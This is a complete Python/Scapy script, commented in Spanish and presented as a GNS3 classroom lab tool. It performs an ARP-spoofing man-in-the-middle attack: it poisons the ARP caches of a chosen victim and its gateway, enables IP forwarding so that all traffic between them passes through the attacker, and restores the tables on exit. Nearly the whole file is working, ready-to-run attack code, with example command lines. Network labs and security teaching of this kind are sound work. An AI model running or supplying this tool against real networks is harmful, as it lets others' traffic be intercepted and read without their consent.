#!/usr/bin/env python3
"""
ARP Spoofing MitM Attack - Para laboratorio GNS3
Intercepta tráfico entre dos hosts mediante envenenamiento ARP
"""

from scapy.all import *
import sys
import os
import time
import argparse

#Configuracion inicial
INTERFACE = "eth0"

class ARPSpoofer:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = None
        self.gateway_mac = None
        self.running = False
        
    def get_mac(self, ip):
        """
        Obtiene la dirección MAC de una IP mediante ARP request
        """
        print(f"[*] Resolviendo MAC de {ip}...")
        
        # Crear paquete ARP request
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        
        # Enviar y recibir respuesta
        answered_list = srp(arp_request_broadcast, 
                           timeout=2, 
                           verbose=0,
                           iface=self.interface)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            return None
    
    def restore_arp(self, dest_ip, source_ip, dest_mac, source_mac):
        """
        Restaura las tablas ARP originales
        """
        packet = ARP(op=2,  # ARP Reply
                    pdst=dest_ip,
                    hwdst=dest_mac,
                    psrc=source_ip,
                    hwsrc=source_mac)
        
        send(packet, verbose=0, count=5, iface=self.interface)
    
    def spoof(self, target_ip, spoof_ip, target_mac):
        """
        Envía paquetes ARP falsos para envenenar la caché ARP
        """
        # Crear paquete ARP falso
        packet = ARP(op=2,  # ARP Reply (is-at)
                    pdst=target_ip,      # IP destino (víctima)
                    hwdst=target_mac,    # MAC destino (víctima)
                    psrc=spoof_ip,       # IP que suplantamos
                    hwsrc=get_if_hwaddr(self.interface))  # Nuestra MAC
        
        send(packet, verbose=0, iface=self.interface)
    
    def poison_loop(self):
        """
        Loop continuo de envenenamiento ARP
        """
        print(f"\n[*] Iniciando envenenamiento ARP...")
        print(f"[*] Presiona Ctrl+C para detener el ataque\n")
        
        packet_count = 0
        
        try:
            while self.running:
                # Envenenar PC1 (hacerle creer que somos el Gateway)
                self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
                
                # Envenenar Gateway (hacerle creer que somos PC1)
                self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                
                packet_count += 2
                
                # Mostrar progreso
                if packet_count % 10 == 0:
                    print(f"[+] Paquetes ARP enviados: {packet_count} | "
                          f"{self.target_ip} <-> {self.gateway_ip}")
                
                time.sleep(2)  # Enviar cada 2 segundos
                
        except KeyboardInterrupt:
            print(f"\n[!] Deteniendo envenenamiento ARP...")
            self.running = False
    
    def enable_ip_forwarding(self):
        """
        Habilita IP forwarding en Linux
        """
        print("[*] Habilitando IP forwarding...")
        
        # Leer estado actual
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            current = f.read().strip()
        
        if current == "1":
            print("[✓] IP forwarding ya está habilitado")
            return True
        
        # Habilitar
        try:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            print("[✓] IP forwarding habilitado")
            return True
        except:
            print("[✗] Error al habilitar IP forwarding")
            return False
    
    def disable_ip_forwarding(self):
        """
        Deshabilita IP forwarding
        """
        print("[*] Deshabilitando IP forwarding...")
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[✓] IP forwarding deshabilitado")
    
    def start_attack(self):
        """
        Inicia el ataque MitM
        """
        print("\n" + "="*70)
        print("              ARP SPOOFING MAN-IN-THE-MIDDLE ATTACK")
        print("="*70)
        print(f"\n[+] Objetivo (Target): {self.target_ip}")
        print(f"[+] Gateway: {self.gateway_ip}")
        print(f"[+] Interfaz: {self.interface}")
        
        # Obtener MACs
        print("\n[*] Obteniendo direcciones MAC...\n")
        
        self.target_mac = self.get_mac(self.target_ip)
        if not self.target_mac:
            print(f"[✗] No se pudo obtener MAC de {self.target_ip}")
            return False
        print(f"[✓] Target MAC: {self.target_mac}")
        
        self.gateway_mac = self.get_mac(self.gateway_ip)
        if not self.gateway_mac:
            print(f"[✗] No se pudo obtener MAC de {self.gateway_ip}")
            return False
        print(f"[✓] Gateway MAC: {self.gateway_mac}")
        
        # Habilitar IP forwarding
        if not self.enable_ip_forwarding():
            return False
        
        # Iniciar envenenamiento
        self.running = True
        
        try:
            self.poison_loop()
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()
        
        return True
    
    def cleanup(self):
        """
        Restaura el estado original de la red
        """
        print("\n\n" + "="*70)
        print("                    LIMPIEZA Y RESTAURACIÓN")
        print("="*70)
        
        print("\n[*] Restaurando tablas ARP originales...")
        
        # Restaurar ARP de PC1
        self.restore_arp(self.target_ip, 
                        self.gateway_ip, 
                        self.target_mac, 
                        self.gateway_mac)
        print(f"[✓] ARP de {self.target_ip} restaurada")
        
        # Restaurar ARP del Gateway
        self.restore_arp(self.gateway_ip, 
                        self.target_ip, 
                        self.gateway_mac, 
                        self.target_mac)
        print(f"[✓] ARP de {self.gateway_ip} restaurada")
        
        # Deshabilitar IP forwarding
        self.disable_ip_forwarding()
        
        print("\n[✓] Limpieza completada")
        print("="*70 + "\n")


def verificar_requisitos():
    """
    Verifica los requisitos del sistema
    """
    print("\n[*] Verificando requisitos...\n")
    
    # Privilegios root
    if os.geteuid() != 0:
        print("[✗] ERROR: Se requieren privilegios de root, si sigues usando el programa sin usar sudo te vas a quemar wey")
        print("[!] Ejecuta: sudo python3 arp_mitm.py -t TARGET_IP -g GATEWAY_IP\n")
        return False
    print("[✓] Privilegios de root: OK")
    
    # Scapy
    try:
        from scapy.all import ARP
        print("[✓] Scapy instalado: OK")
    except:
        print("[✗] ERROR: Scapy no está instalado, pariguayo")
        print("[!] Instala con: pip3 install scapy")
        return False
    
    return True


def main():
    """
    Función principal
    """
    # Banner
    print("\n" + "="*70)
    print("              ARP SPOOFING MitM Para Laboratorio")
    print("          Para uso en GNS3, no me hagan plagio")
    print("="*70)
    
    # Argumentos
    parser = argparse.ArgumentParser(
        description="ARP Spoofing MitM Attack para GNS3",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  sudo python3 arp_mitm.py -t 192.168.10.22 -g 192.168.10.1
  sudo python3 arp_mitm.py -t 192.168.10.22 -g 192.168.10.1 -i eth0
  
Para el uso de laboratorio:
  PC1: IP de pc1
  PC2: IP de pc 2
  Gateway: IP del Router principal
        """
    )
    
    parser.add_argument('-t', '--target', 
                       required=True,
                       dest='target',
                       help='IP de la víctima (ej: 192.168.10.22)')
    
    parser.add_argument('-g', '--gateway', 
                       required=True,
                       dest='gateway',
                       help='IP del gateway (ej: 192.168.10.1)')
    
    parser.add_argument('-i', '--interface', 
                       default='eth0',
                       dest='interface',
                       help='Interfaz de red (default: eth0)')
    
    args = parser.parse_args()
    
    # Verificar requisitos
    if not verificar_requisitos():
        sys.exit(1)
    
    # Advertencia
    print("\n" + "_"*70)
    print("                       Revisor")
    print("_"*70)
    print(f"""
    Este script interceptará TODO el tráfico entre:
    - Víctima: {args.target}
    - Gateway: {args.gateway}
    
    Solo no lo uses para plaguio, y lo lo copias almenos cambia el codigo un poco pls.
    """)
    print("_"*70 + "\n")
    
    try:
        respuesta = input("[?] ¿Continuar con el ataque? (si/no): ").strip().lower()
        if respuesta not in ['si', 's', 'yes', 'y']:
            print("\n[!] Ataque cancelado\n")
            sys.exit(0)
    except KeyboardInterrupt:
        print("\n\n[!] Cancelado\n")
        sys.exit(0)
    
    # Crear spoofer y ejecutar ataque
    spoofer = ARPSpoofer(args.target, args.gateway, args.interface)
    spoofer.start_attack()


if __name__ == "__main__":
    main()
